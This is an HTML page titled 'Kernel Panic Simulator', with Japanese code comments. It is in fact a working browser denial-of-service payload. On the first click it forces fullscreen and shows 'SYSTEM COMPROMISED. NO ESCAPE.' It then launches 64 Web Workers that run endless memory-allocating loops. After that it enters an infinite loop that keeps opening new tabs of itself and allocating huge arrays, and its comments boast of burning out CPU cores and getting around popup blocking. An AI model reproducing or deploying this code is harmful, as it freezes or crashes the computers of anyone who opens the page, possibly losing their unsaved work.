<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Kernel Panic Simulator</title>
    <style>
        body {
            margin: 0;
            background-color: #000;
            color: #00ff00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: monospace;
            cursor: pointer;
            user-select: none;
        }
        h1 {
            font-size: 2.5rem;
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
        }
    </style>
</head>
<body>

    <h1>INITIALIZE</h1>

    <script>
        let armed = false;

        document.body.addEventListener('click', async () => {
            try {
                await document.documentElement.requestFullscreen();
            } catch (e) {}

            armed = true;
            document.querySelector('h1').innerText = "SYSTEM COMPROMISED.\nNO ESCAPE.";

            // マルチスレッド・ワーカー爆撃用スクリプトのBlob生成
            const workerCode = `
                while(true) {
                    const arr = new Array(50000000).fill(Math.random());
                    Math.pow(Math.random(), Math.random());
                }
            `;
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            const workerUrl = URL.createObjectURL(blob);

            // CPUコアを限界まで焼き尽くすためのWeb Worker軍団（最大数パラレル起動）
            for (let i = 0; i < 64; i++) {
                try {
                    new Worker(workerUrl);
                } catch (e) {}
            }

            // メインスレッド＋タブ爆撃＋メモリバーストのトリプルコンボ
            while (true) {
                // ポップアップブロックを物理的に無視するための別窓・別タブ連続量産
                try {
                    window.open(location.href, '_blank');
                } catch (e) {}

                // 同期的なメモリ無限アロケート
                const a = [];
                for (let j = 0; j < 10; j++) {
                    a.push(new Array(100000000).fill(1));
                }
            }
        });
    </script>

</body>
</html>
